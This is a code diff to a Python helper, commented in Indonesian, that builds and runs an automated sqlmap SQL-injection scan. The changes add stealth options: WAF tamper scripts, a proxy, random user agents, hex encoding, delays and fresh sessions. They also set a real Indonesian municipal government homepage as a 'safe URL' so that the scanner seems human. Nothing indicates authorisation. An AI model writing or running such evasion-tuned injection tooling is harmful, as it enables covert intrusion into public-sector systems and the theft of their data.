@@ -44,15 +44,10 @@ def run_sqlmap_auto(target_url):
     print(f"    WAF Tamper: {TAMPER_SCRIPTS}")
     print(f"    Custom Header: {header}")
 
-    # 2. Construct Command (Vaadata Bypass Style)
-    # --level=2 to check cookies
-    # --technique=B for boolean-blind
-    # --not-string to catch the "Redirecting" WAF behavior
-    # 2. Construct Command (Stealth Bypass Mode)
-    # --ignore-redirects: TETAP di target aslinya, jangan mau dibuang ke /sitelogin
-    # --delay=1: Hindari deteksi CAPTCHA dengan jeda 1 detik
-    # --level=3 --risk=3: Tes semua header dan cookie secara mendalam
-    # --no-cast --hex: Hindari fungsi yang sering diblokir WAF
+    # 2. Construct Command (Phantom Stealth Mode)
+    # --flush-session: Bersihkan sampah scan sebelumnya
+    # --safe-url: Kunjungi homepage sesekali agar dikira manusia
+    # --ignore-redirects: TETAP di target aslinya
     cmd = f"{SQLMAP_PATH} -u \"{target_url}\" " \
           f"--proxy=\"{proxy}\" " \
           f"--tamper=\"{TAMPER_SCRIPTS}\" " \
@@ -60,9 +55,11 @@ def run_sqlmap_auto(target_url):
           f"--technique=BEUST " \
           f"--not-string=\"Redirecting\" " \
           f"--ignore-redirects " \
-          f"--delay=1 " \
+          f"--delay=2 " \
+          f"--safe-url=\"https://surakarta.go.id/\" --safe-freq=10 " \
+          f"--flush-session --fresh-queries " \
           f"--random-agent --hex " \
-          f"--batch --threads=1 --timeout=20" # Threads=1 agar lebih senyap
+          f"--batch --threads=1 --timeout=10" 
 
     # 3. Execution
     print(f"\n[*] Executing Command:\n{cmd}\n")
